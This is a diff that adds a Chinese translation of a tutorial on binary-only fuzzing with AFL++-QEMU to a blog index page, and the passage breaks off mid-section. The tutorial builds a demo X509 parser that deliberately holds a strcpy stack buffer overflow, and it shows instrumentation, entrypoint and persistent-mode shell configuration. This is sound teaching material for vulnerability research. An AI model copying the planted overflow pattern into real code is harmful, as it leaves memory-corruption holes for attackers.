@@ -131,6 +131,359 @@
 						<div class="row">
 							<div class="col-md-8">
 								<h3 class="title">
+									<a href="/2023/07/20/AFL-QEMU/" >使用 AFL++-QEMU 和 libprotobuf 的高级二进制模糊：语法感知和内存中持续模糊的实际案例</a>
+								</h3>
+							</div>
+							<div class="col-md-4">
+								<div class="date">post @ 2023-07-20
+								</div>
+							</div>
+						</div>
+						
+								
+			<div class="entry">
+  <div class="row">
+	
+	
+		<blockquote>
+<p>原文链接：<a target="_blank" rel="noopener" href="https://airbus-seclab.github.io/AFLplusplus-blogpost/">https://airbus-seclab.github.io/AFLplusplus-blogpost/</a></p>
+</blockquote>
+<p>想象一下，你在一个<strong>没有源代码</strong>的二进制文件中发现了一个可能存在漏洞的函数。为了帮助你识别漏洞，你需要<strong>尽可能使用最相关的 AFL++ 配置进行模糊处理</strong>。然而，由于在实践中实现这样的工具并不容易，我们决定在一篇博客文章中总结我们的经验和方法，以帮助未来的工作。</p>
+<p>这篇博文介绍了如何利用 AFL++-QEMU 的<strong>高级功能</strong>，在<strong>实际案例</strong>中逐步开始语法感知和内存中持续模糊测试。我们提供了所有脚本和数据（以及 ELF 目标），您可以在阅读本博文的同时自己进行实验。尽管我们鼓励您这样做，但这完全是可选的；您也可以只通过通读来欣赏这篇文章，我们希望您仍能从中学到东西！</p>
+<h2 id="二进制模糊：一些反复出现的问题"><a href="#二进制模糊：一些反复出现的问题" class="headerlink" title="二进制模糊：一些反复出现的问题"></a>二进制模糊：一些反复出现的问题</h2><p>QEMU 是 AFL++ 支持的后端之一，用于处理纯二进制程序的插装。</p>
+<p>在实践中，这意味着与源代码可用的目标相反，您不需要重新编译源代码来获得检测二进制文件。相反，AFL++ 会使用 QEMU 的补丁版<a target="_blank" rel="noopener" href="https://qemu-project.gitlab.io/qemu/user/index.html">用户模式仿真</a>执行原始二进制文件，以收集覆盖信息。   </p>
+<p><strong>注意事项：</strong></p>
+<ul>
+<li>如果你想了解有关 QEMU 内部的更多信息，请务必查看<a target="_blank" rel="noopener" href="https://airbus-seclab.github.io/qemu_blog">本系列文章</a>。</li>
+<li>在本文中，我们只探讨 QEMU 后端。然而，这里详细描述的大多数概念应该适用于其他可用的<a target="_blank" rel="noopener" href="https://github.com/AFLplusplus/AFLplusplus/blob/stable/docs/fuzzing_binary-only_targets.md">AFL++ 后端</a>。</li>
+</ul>
+<p>使用 QEMU 模式（使用 <code>-Q</code> 标志）执行 Fuzzing 的基本操作如下图所示：</p>
+<p><img src="https://airbus-seclab.github.io/AFLplusplus-blogpost/img/basic-fuzzing.png?raw=true" alt="图解命令行"></p>
+<p>使用 QEMU 模式，可以配置不同的方面来优化 Fuzzing 性能和覆盖范围。<a target="_blank" rel="noopener" href="https://github.com/AFLplusplus/AFLplusplus/blob/stable/qemu_mode/README.md">官方文档</a>介绍了所有可用的功能。其中：</p>
+<ul>
+<li>插桩和覆盖率：<ul>
+<li><code>AFL_INST_LIBS</code></li>
+<li><code>AFL_QEMU_INST_RANGES</code></li>
+</ul>
+</li>
+<li>突变：<ul>
+<li><code>AFL_CUSTOM_MUTATOR_LIBRARY</code></li>
+<li><code>AFL_CUSTOM_MUTATOR_ONLY</code></li>
+</ul>
+</li>
+<li>变异：<ul>
+<li><code>AFL_ENTRYPOINT</code></li>
+<li><code>AFL_QEMU_PERSISTENT_ADDR</code>&#x2F; <code>AFL_QEMU_PERSISTENT_ADDR_RET</code></li>
+<li><code>AFL_QEMU_PERSISTENT_HOOK</code></li>
+<li><code>AFL_DISABLE_TRIM</code></li>
+<li><code>AFL_DEBUG</code>&#x2F; <code>AFL_DEBUG_CHILD</code></li>
+</ul>
+</li>
+</ul>
+<p>本文旨在介绍我们如何在实际案例中回答这些问题，从基本配置到针对目标进行优化的设置，这些都可以重复使用并应用于其他类似项目。</p>
+<p>然而，从理论到实践有时显得枯燥乏味，而且经常会产生一些反复出现的问题，例如：</p>
+<ul>
+<li>我们希望插桩检测覆盖哪段代码？</li>
+<li>Fuzzer 入口点的最佳选择是什么？</li>
+<li>移动入口点对测试用例的格式意味着什么？</li>
+<li>我们的工作如何从 AFL++ 中提供的高级功能中获益，以提高性能？</li>
+</ul>
+<p>本文旨在介绍我们如何在实际案例中回答这些问题，从基本配置到针对目标进行优化的设置，并且这些都可以重复使用并应用于其他类似项目。</p>
+<h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><h3 id="弱-X509-解析器"><a href="#弱-X509-解析器" class="headerlink" title="弱 X509 解析器"></a>弱 X509 解析器</h3><p>我们选择的<a target="_blank" rel="noopener" href="https://github.com/airbus-seclab/AFLplusplus-blogpost/tree/main/src">示例</a>灵感来自于我们在安全评估期间遇到的现实生活中的目标（但由于显而易见的原因，无法重新分配）。它是一个二进制文件，需要一个文件名作为输入，并尝试将相应文件的内容解析为 X509 证书。</p>
+<p>它只包含几个基本功能：</p>
+<ul>
+<li><code>main</code>：main 函数，该函数将文件作为输入并以该文件作为参数进行调用 <code>parse_cert</code>；</li>
+<li><code>parse_cert</code>：调用 <code>read_file</code> 并将读取缓冲区作为参数提供给 <code>parse_cert_buf</code>；</li>
+<li><code>read_file</code>：打开文件，读取并返回其内容；</li>
+<li><code>parse_cert_buf</code>：将缓冲区解析 <code>openssl</code> 为 C 库中的 X509 证书 <code>d2i_X509</code>，尝试获取 CN 并打印它。</li>
+</ul>
+<p>此目标故意包含一个我们希望在 Fuzzing 活动期间触及的小漏洞：中的基于栈的缓冲区溢出 <code>parse_cert_buf</code>：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">parse_cert_buf</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *buf, <span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">    X509 *cert;</span><br><span class="line">    <span class="type">char</span> cn[MAX_CN_SIZE];</span><br><span class="line"></span><br><span class="line">    cert = d2i_X509(<span class="literal">NULL</span>, &amp;buf, len);</span><br><span class="line">    ...</span><br><span class="line">    <span class="type">char</span> *subj = X509_NAME_oneline(X509_get_subject_name(cert), <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(cn, subj);  <span class="comment">// Oops</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Got CN=&#x27;%s&#x27; from certificate\n&quot;</span>, cn);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>此外，还特意在主程序开始时添加了一个虚拟 <code>init</code> 函数，以模拟初始化阶段，该阶段将花费时间并使目标缓慢启动。</p>
+<h3 id="探索目标"><a href="#探索目标" class="headerlink" title="探索目标"></a>探索目标</h3><p>在现实生活中，目标显然不像我们的<a target="_blank" rel="noopener" href="https://github.com/airbus-seclab/AFLplusplus-blogpost/tree/main/src/target.c">弱 X509 解析器</a>那么简单。事实上，一个好的仅有二进制目标的模糊活动总是从逆向工程阶段开始：</p>
+<ul>
+<li>了解目标，它是如何工作的，它如何与环境交互等。</li>
+<li>确定要研究的有趣特征；</li>
+<li>找到可能被证明是好的模糊目标的函数；</li>
+<li>分析调用上下文、结构、用户控制的参数等。</li>
+<li>使用适当的参数和模糊化的输入构建一个工具或工具链来调用目标函数。</li>
+<li>生成初始语料库以启动 Fuzzer.</li>
+</ul>
+<p>尽管有一些工具（如<a target="_blank" rel="noopener" href="https://github.com/ex0dus-0x/fuzzable">fuzzable</a>）可以帮助完成其中的一些步骤，但它们通常仍然是模糊二进制目标的必需的、繁琐的和手动的部分。</p>
+<p>由于我们的示例很简单，因此你应该不会花费太长时间来查找易受攻击的代码、调用跟踪和 To<strong>识别感兴趣的功能</strong>： <code>parse_cert_buf</code>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">00000000000013d4 &lt;parse_cert_buf&gt;:</span><br><span class="line">    13d4: 55                    push   rbp</span><br><span class="line">    13d5: 48 89 e5              mov    rbp,rsp</span><br><span class="line">    13d8: 53                    push   rbx</span><br><span class="line">    13d9: 48 83 ec 68           sub    rsp,0x68</span><br><span class="line">...</span><br><span class="line">    1473: 48 89 d6              mov    rsi,rdx</span><br><span class="line">    1476: 48 89 c7              mov    rdi,rax</span><br><span class="line">    1479: e8 92 fc ff ff        call   1110 &lt;strcpy@plt&gt;</span><br><span class="line">...</span><br><span class="line">    14d9: b8 00 00 00 00        mov    eax,0x0</span><br><span class="line">    14de: 48 8b 5d f8           mov    rbx,QWORD PTR [rbp-0x8]</span><br><span class="line">    14e2: c9                    leave</span><br><span class="line">    14e3: c3                    ret</span><br></pre></td></tr></table></figure>
+
+<p><strong>注意：</strong> 你获得的地址可能会根据你的编译器、其版本、使用的选项等而改变。只要它们是一致的，就不用担心！</p>
+<p>现在，最有趣的部分：模糊这个目标！为此，请关注本文的其余部分</p>
+<h2 id="语料"><a href="#语料" class="headerlink" title="语料"></a>语料</h2><h3 id="收集输入"><a href="#收集输入" class="headerlink" title="收集输入"></a>收集输入</h3><p>在此之前，我们需要收集样本输入文件来构建语料库。事实上，这些<a target="_blank" rel="noopener" href="https://github.com/AFLplusplus/AFLplusplus/blob/stable/docs/fuzzing_in_depth.md#a-collecting-inputs">AFL++ 文档</a>指出：</p>
+<blockquote>
+<p>要正确操作，Fuzzer 需要一个或多个启动文件<br>包含目标通常期望的输入数据的良好示例</p>
+</blockquote>
+<p>在我们的例子中，由于目标解析证书，我们只需使用 OpenSSL 生成一个证书：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ openssl req -nodes -new -x509 -keyout key.pem -out cert.pem</span><br></pre></td></tr></table></figure>
+
+<p>为了使事情更简单，我们已经在<a target="_blank" rel="noopener" href="https://github.com/airbus-seclab/AFLplusplus-blogpost/tree/main/step0/corpus">corpus</a>文件夹中提供了一个。</p>
+<h3 id="预处理语料库"><a href="#预处理语料库" class="headerlink" title="预处理语料库"></a>预处理语料库</h3><p>在使用这个语料库之前，我们可以：</p>
+<ol>
+<li>仅保留导致不同执行路径的输入样本（使用 <code>afl-cmin</code>）；</li>
+<li>最小化每个输入样本以保留其独特的执行路径，同时使其大小尽可能小（使用 <code>afl-tmin</code>）。这将使未来的突变更加有效。</li>
+</ol>
+<p>我们将这两个步骤合并到一个<a target="_blank" rel="noopener" href="https://github.com/airbus-seclab/AFLplusplus-blogpost/tree/main/step0/build_corpus.sh">build_corpus.sh</a>脚本中。</p>
+<p>现在，假设你按照中 <code>README.md</code> 的步骤构建了 AFL++，你可以继续从 <code>step0</code> 目录中运行 <code>build_corpus.sh</code>。这将完成语料库最小化步骤，并为下一步做好准备。</p>
+<p>我们现在应该具备<em>真实的</em>运行 AFL++ 的所有先决条件。我们将在下一步深入，所以继续跟上！</p>
+<h2 id="仪器仪表"><a href="#仪器仪表" class="headerlink" title="仪器仪表"></a>仪器仪表</h2><p>AFL++ 是一个“覆盖率引导”的模糊测试工具，这意味着变异策略要分析先前执行的代码覆盖，以生成新的输入。为了构建覆盖信息，AFL++-QEMU 需要知道已经到达了哪些基本块。这是通过检测每个基本块以在其被击中时进行跟踪来实现的。</p>
+<h3 id="默认设置（step0）"><a href="#默认设置（step0）" class="headerlink" title="默认设置（step0）"></a>默认设置（<a target="_blank" rel="noopener" href="https://github.com/airbus-seclab/AFLplusplus-blogpost/tree/main/step0">step0</a>）</h3><p>默认情况下，通过启动 AFL++-QEMU（如中所示<a target="_blank" rel="noopener" href="https://github.com/airbus-seclab/AFLplusplus-blogpost/tree/main/step0">step0</a>），<strong>目标的所有基本块</strong>可以对其进行插装，并且插装中<strong>不</strong>包含共享库。</p>
+<p>注意这个 <code>exec speed</code> 指标：你可以关注它是如何随着我们帖子的每一步发展的。</p>
+<h3 id="插桩调整（step1）"><a href="#插桩调整（step1）" class="headerlink" title="插桩调整（step1）"></a>插桩调整（<a target="_blank" rel="noopener" href="https://github.com/airbus-seclab/AFLplusplus-blogpost/tree/main/step1">step1</a>）</h3><p>对于研究目标来说，改变这种默认的插桩行为是很有趣的。原因可能包括：</p>
+<ul>
+<li>你对覆盖由主二进制文件导入的库中所有可能的路径感兴趣</li>
+<li>你想要排除已测试安全性的库的特定部分</li>
+<li>检测完整的大型二进制文件会降低执行速度</li>
+</ul>
+<p>要查看指令插入的范围，可使用以下选项：</p>
+<ul>
+<li><code>AFL_INST_LIBS</code>;</li>
+<li><code>AFL_QEMU_INST_RANGES</code>;</li>
+<li><code>AFL_CODE_START</code>;</li>
+<li><code>AFL_CODE_END</code>。</li>
+</ul>
+<p>在我们的示例中，虽然它对仪器 <code>parse_cert_buf</code> 至关重要，但它与仪器 <code>main</code>和共享库（例如 <code>libssl.so</code>）的关系不大。为了对此进行配置，我们将工具仅限于感兴趣的函数。这是通过设置 <code>AFL_QEMU_INST_RANGES</code>（请参阅<a target="_blank" rel="noopener" href="https://github.com/airbus-seclab/AFLplusplus-blogpost/tree/main/step1">step1</a>）来完成的：</p>
+<ul>
+<li>从 <code>parse_cert_buf</code> 第一条指令的地址开始</li>
+<li>到 <code>parse_cert_buf</code> 最后一条指令的地址结束</li>
+</ul>
+<p><strong>注意：</strong>，在我们的例子中也可以使用 <code>AFL_CODE_START</code> 和 <code>AFL_CODE_END</code> 来完成。但是， <code>AFL_QEMU_INST_RANGES</code> 更灵活，因为它允许指定多个要检测的范围，因此我们更喜欢使用此环境变量。</p>
+<p>这些地址可以手动确定，也可以从 <code>objdump</code> 输出中推断出来：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># The base address at which QEMU loads our binary depends on the target</span></span><br><span class="line"><span class="comment"># See https://github.com/AFLplusplus/AFLplusplus/blob/stable/qemu_mode/README.persistent.md#21-the-start-address</span></span><br><span class="line"><span class="keyword">case</span> $(file <span class="string">&quot;<span class="variable">$target_path</span>&quot;</span>) <span class="keyword">in</span></span><br><span class="line">  *<span class="string">&quot;statically linked&quot;</span>*)</span><br><span class="line">    QEMU_BASE_ADDRESS=0</span><br><span class="line">    ;;</span><br><span class="line">  *<span class="string">&quot;32-bit&quot;</span>*)</span><br><span class="line">    QEMU_BASE_ADDRESS=0x40000000</span><br><span class="line">    ;;</span><br><span class="line">  *<span class="string">&quot;64-bit&quot;</span>*)</span><br><span class="line">    QEMU_BASE_ADDRESS=0x4000000000</span><br><span class="line">    ;;</span><br><span class="line">  *) <span class="built_in">echo</span> <span class="string">&quot;Failed to guess QEMU_BASE_ADDRESS&quot;</span>; <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">esac</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># We use objdump to parse our target binary and obtain the address and size of a given function</span></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">find_func</span></span>() &#123;</span><br><span class="line">    objdump -t <span class="string">&quot;<span class="variable">$target_path</span>&quot;</span> | awk -n /<span class="string">&quot;<span class="variable">$1</span>&quot;</span><span class="string">&#x27;$/&#123;print &quot;0x&quot;$1, &quot;0x&quot;$5&#125;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Some environment variables for AFL++ must be hex encoded</span></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">hex_encode</span></span>() &#123;</span><br><span class="line">    <span class="built_in">printf</span> <span class="string">&quot;0x%x&quot;</span> <span class="string">&quot;<span class="variable">$1</span>&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">read</span> fuzz_func_addr fuzz_func_size &lt; &lt;(find_func <span class="string">&quot;parse_cert_buf&quot;</span>)</span><br><span class="line">inst_start=$(hex_encode $((&quot;<span class="variable">$QEMU_BASE_ADDRESS</span>&quot; + &quot;<span class="variable">$fuzz_func_addr</span>&quot;)))</span><br><span class="line">inst_end=$(hex_encode $((&quot;<span class="variable">$inst_start</span>&quot; + &quot;<span class="variable">$fuzz_func_size</span>&quot;)))</span><br><span class="line"><span class="built_in">export</span> AFL_QEMU_INST_RANGES=<span class="string">&quot;<span class="variable">$inst_start</span>-<span class="variable">$inst_end</span>&quot;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ find_func <span class="string">&quot;parse_cert_buf&quot;</span></span><br><span class="line">0x00000000000013d4 0x0000000000000110</span><br></pre></td></tr></table></figure>
+
+<p>通过启用 AFL++-QEMU 的调试模式（<code>AFL_DEBUG</code>），我们可以检查<strong>插桩范围符合我们的要求</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Instrument range: 0x40000013d4-0x40000014e4 (&lt;noname&gt;)</span><br></pre></td></tr></table></figure>
+
+<p>从现在开始我们的目标是<strong>仅对感兴趣的部分进行检测，并准备进行Fuzz</strong>。</p>
+<h2 id="入口点"><a href="#入口点" class="headerlink" title="入口点"></a>入口点</h2><h3 id="概念和默认行为"><a href="#概念和默认行为" class="headerlink" title="概念和默认行为"></a>概念和默认行为</h3><p>当模糊化时，AFL++ 运行目标，直到到达特定地址（AFL 入口点），然后从那里为每个迭代分叉。默认情况下，AFL 入口点设置为目标的入口点（在我们的示例 <code>target</code> 中为 <code>_start</code> 函数）。</p>
+<p>实际上，在默认配置中，AFL++ 会打印以下消息：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># from the step0 directory</span></span><br><span class="line">$ AFL_DEBUG=1 ./fuzz.sh | grep entrypoint</span><br><span class="line">AFL forkserver entrypoint: 0x40000011a0</span><br></pre></td></tr></table></figure>
+
+<p>反汇编 <code>target</code> <code>objdump</code> 确认入口点设置为 <code>_start</code> 函数的地址：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># from the step0 directory</span></span><br><span class="line">$ objdump -d --start-address=0x11a0 ../src/target | <span class="built_in">head</span> -n20</span><br><span class="line">00000000000011a0 &lt;_start&gt;:</span><br><span class="line">    11a0: 31 ed                 xor    ebp,ebp</span><br><span class="line">    11a2: 49 89 d1              mov    r9,rdx</span><br><span class="line">    ...</span><br><span class="line">    11b4: 48 8d 3d fa 03 00 00  lea    rdi,[rip+0x3fa]         <span class="comment"># 15b5 &lt;main&gt;</span></span><br><span class="line">    11bb: ff 15 1f 2e 00 00     call   QWORD PTR [rip+0x2e1f]  <span class="comment"># 3fe0 &lt;__libc_start_main@GLIBC_2.34&gt;</span></span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
+
+<p>使用此配置，每次迭代都会运行整个目标。</p>
+<h3 id="定位选择（step2）"><a href="#定位选择（step2）" class="headerlink" title="定位选择（step2）"></a>定位选择（<a target="_blank" rel="noopener" href="https://github.com/airbus-seclab/AFLplusplus-blogpost/tree/main/step2">step2</a>）</h3><p>在某些情况下（如我们的示例），程序的初始化阶段可能需要一些时间。因为每次迭代都要执行初始化，所以对fuzz速度有直接影响。这正是 <code>AFL_ENTRYPOINT</code> 变量所要处理的情况。</p>
+<p>实际上， <code>AFL_ENTRYPOINT</code> 可以设置为相关的自定义值，该值将：</p>
+<ul>
+<li>只运行一次初始化阶段，直到到达该 <code>AFL_ENTRYPOINT</code> 地址。</li>
+<li>将目标停止在， <code>AFL_ENTRYPOINT</code> 并与fuzzer同步；</li>
+<li>让 fuzzer 对目标的状态进行快照，然后在 <code>AFL_ENTRYPOINT</code> 地址之后继续执行。</li>
+</ul>
+<p>这样，在 fork 服务器运行所有迭代之前，初始化阶段只运行一次，并且 fuzzing 被加速。</p>
+<p>在我们的示例中，的 <code>AFL_ENTRYPOINT</code> 定位选择非常简单，因为：</p>
+<ul>
+<li><code>init</code> 代码不需要模糊化；</li>
+<li><code>init</code> 阶段每次都是执行同样内容；</li>
+<li>与模糊相关的函数已经确定（<code>parse_cert</code>）。</li>
+</ul>
+<p>因此，我们可以将 <code>AFL_ENTRYPOINT</code> 设置为 <code>parse_cert</code> 函数的开头（请参阅<a target="_blank" rel="noopener" href="https://github.com/airbus-seclab/AFLplusplus-blogpost/tree/main/step2">step2</a>）：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Define a custom AFL++ entrypoint executed later than the default (the binary&#x27;s</span></span><br><span class="line"><span class="comment"># entrypoint)</span></span><br><span class="line"><span class="built_in">read</span> fuzz_func_addr fuzz_func_size &lt; &lt;(find_func <span class="string">&quot;parse_cert&quot;</span>)</span><br><span class="line"><span class="built_in">export</span> AFL_ENTRYPOINT=$(hex_encode $((&quot;<span class="variable">$QEMU_BASE_ADDRESS</span>&quot; + &quot;<span class="variable">$fuzz_func_addr</span>&quot;)))</span><br></pre></td></tr></table></figure>
+
+<p>在此配置中，AFL++ 打印以下消息：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ AFL_DEBUG=1 ./fuzz.sh | grep entrypoint</span><br><span class="line">AFL forkserver entrypoint: 0x40000014e4</span><br></pre></td></tr></table></figure>
+
+<p>我们可以通过反汇编 <code>target</code> 来确认这是的地址 <code>parse_cert</code> ：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ objdump -d --start-address=0x14e4 ../src/target | <span class="built_in">head</span> -n10</span><br><span class="line">00000000000014e4 &lt;parse_cert&gt;:</span><br><span class="line">    14e4: 55                    push   rbp</span><br><span class="line">    14e5: 48 89 e5              mov    rbp,rsp</span><br><span class="line">    14e8: 48 83 ec 20           sub    rsp,0x20</span><br></pre></td></tr></table></figure>
+
+<h3 id="对性能的影响"><a href="#对性能的影响" class="headerlink" title="对性能的影响"></a>对性能的影响</h3><p>运行 Fuzzer 让我们看到调整 <code>AFL_ENTRYPOINT</code> 的优势：</p>
+<ul>
+<li><p>使用默认设置 <code>AFL_ENTRYPOINT</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec speed : 18.24/sec (zzzz...)</span><br></pre></td></tr></table></figure></li>
+<li><p>调整 <code>AFL_ENTRYPOINT</code> 后（为了跳过 <code>init</code> 相位）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec speed : 1038/sec</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>这说明<strong>的 <code>AFL_ENTRYPOINT</code> 选择对于模糊器可以执行的每秒测试数量的最大化至关重要</strong>。</p>
+<p>在下一节中，我们将看到性能仍然可以通过利用另一个 AFL++ 特性来进一步提高：持续模式。</p>
+<h2 id="持续"><a href="#持续" class="headerlink" title="持续"></a>持续</h2><h3 id="持续模式（step3）"><a href="#持续模式（step3）" class="headerlink" title="持续模式（step3）"></a>持续模式（<a target="_blank" rel="noopener" href="https://github.com/airbus-seclab/AFLplusplus-blogpost/tree/main/step3">step3</a>）</h3><h4 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h4><p>“持续模式”是允许 AFL++ 避免每个迭代都调用 <code>fork</code> 的特性。相反，它在到达某个地址（<code>AFL_QEMU_PERSISTENT_ADDR</code>）时保存子节点的状态，并在到达另一个地址（ <code>AFL_QEMU_PERSISTENT_RET</code>）时恢复此状态。</p>
+<p><strong>注意：</strong> 除了 <code>AFL_QEMU_PERSISTENT_RET</code>， <code>AFL_QEMU_PERSISTENT_RETADDR_OFFSET</code> 也可以使用。如果没有设置这些值，AFL++ 将在到达第一个 <code>ret</code> 指令时停止（仅当 <code>AFL_QEMU_PERSISTENT_ADDR</code> 指向函数的开始时，否则你将<em>必须</em>手动设置该值）。</p>
+<p>“恢复”状态可以指“恢复寄存器”（ <code>AFL_QEMU_PERSISTENT_GPR</code>）和&#x2F;或“恢复内存”（ <code>AFL_QEMU_PERSISTENT_MEM</code>）。由于恢复内存状态的开销很高，因此只应在必要时进行。在进行模糊处理时，请注意稳定性，以查看是否有必要启用此功能。</p>
+<p>即使在使用持续模式时，AFL++ 仍将不时调用 <code>fork</code>（每<code>AFL_QEMU_PERSISTENT_CNT</code> 次迭代，或默认情况下为 1000 次）。如果稳定性足够高，增加此值可能会提高性能（最大值为 10000）。</p>
+<h4 id="应用于我们的示例"><a href="#应用于我们的示例" class="headerlink" title="应用于我们的示例"></a>应用于我们的示例</h4><p>在我们的例子中，我们可以通过设置 <code>AFL_QEMU_PERSISTENT_ADDR</code> 与 <code>AFL_ENTRYPOINT</code>（ <code>parse_cert</code> 函数的地址）相同的值来开始。这样，AFL++ 将把我们的进程恢复到它读取输入文件内容之前的状态。</p>
+<p>以下是相关章节 <code>afl_config.sh</code>：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">read</span> fuzz_func_addr fuzz_func_size &lt; &lt;(find_func <span class="string">&quot;parse_cert&quot;</span>)</span><br><span class="line"><span class="built_in">export</span> AFL_QEMU_PERSISTENT_ADDR=$(hex_encode $((&quot;<span class="variable">$QEMU_BASE_ADDRESS</span>&quot; + &quot;<span class="variable">$fuzz_func_addr</span>&quot;)))</span><br><span class="line"><span class="built_in">export</span> AFL_QEMU_PERSISTENT_GPR=1</span><br><span class="line"><span class="built_in">export</span> AFL_QEMU_PERSISTENT_CNT=10000</span><br></pre></td></tr></table></figure>
+
+<p>在我们的示例中，稳定性保持在 100%，而不必恢复内存状态，因此我们只设置 <code>AFL_QEMU_PERSISTENT_GPR</code>。我们也增加 <code>AFL_QEMU_PERSISTENT_CNT</code> 到它的最大值，因为这不会对我们的稳定性产生负面影响。</p>
+<p>中<a target="_blank" rel="noopener" href="https://github.com/airbus-seclab/AFLplusplus-blogpost/tree/main/step3">step3 文件夹</a>提供的文件直接对此进行测试。你还可以自己确认，AFL++ 文档中描述的性能提升确实存在：根据我们的测试，我们每秒的迭代次数增加了 10 倍以上！</p>
+<h3 id="内存中模糊处理（step4）"><a href="#内存中模糊处理（step4）" class="headerlink" title="内存中模糊处理（step4）"></a>内存中模糊处理（<a target="_blank" rel="noopener" href="https://github.com/airbus-seclab/AFLplusplus-blogpost/tree/main/step4">step4</a>）</h3><p>尽管使用了持续模式，但在到达测试函数之前，我们的目标仍会执行一些不必要的操作，特别是打开和读取由 fuzzer 生成的文件的内容。相反，我们可以使用“内存中模糊处理”来跳过这一步，直接从模糊器的内存中读取输入。</p>
+<h4 id="钩子"><a href="#钩子" class="headerlink" title="钩子"></a>钩子</h4><p>要做到这一点，我们必须实施“挂钩”。它实际上非常简单，其源代码提供在<a target="_blank" rel="noopener" href="https://github.com/airbus-seclab/AFLplusplus-blogpost/tree/main/src/hook/hook.c">这个文件</a>：</p>
+<ul>
+<li>我们定义了一个 <code>afl_persistent_hook_init</code> 函数，它声明我们是否要使用内存中的模糊处理。</li>
+<li>更有趣的是，我们定义了一个 <code>afl_persistent_hook</code> 函数，它可以在每次迭代时覆盖寄存器值和内存，就在 <code>AFL_QEMU_PERSISTENT_ADDR</code> 到达地址之前。我们所要做的就是覆盖包含要解析的缓冲区的内存，并在正确的寄存器中设置其长度。</li>
+</ul>
+<p><strong>注意：</strong> 你可以通过在目标函数的开头运行 <code>gdb</code> 和中断，或者直接通过查看反汇编代码来确定要使用哪些寄存器。</p>
+<p>这个钩子应该被编译为一个共享库，AFL++ 将在运行时加载。</p>
+<h4 id="环境变量-1"><a href="#环境变量-1" class="headerlink" title="环境变量"></a>环境变量</h4><p>要指示 AFL++ 使用我们的钩子，我们只需设置 <code>AFL_QEMU_PERSISTENT_HOOK</code> 文件的 <code>.so</code> 路径：</p>
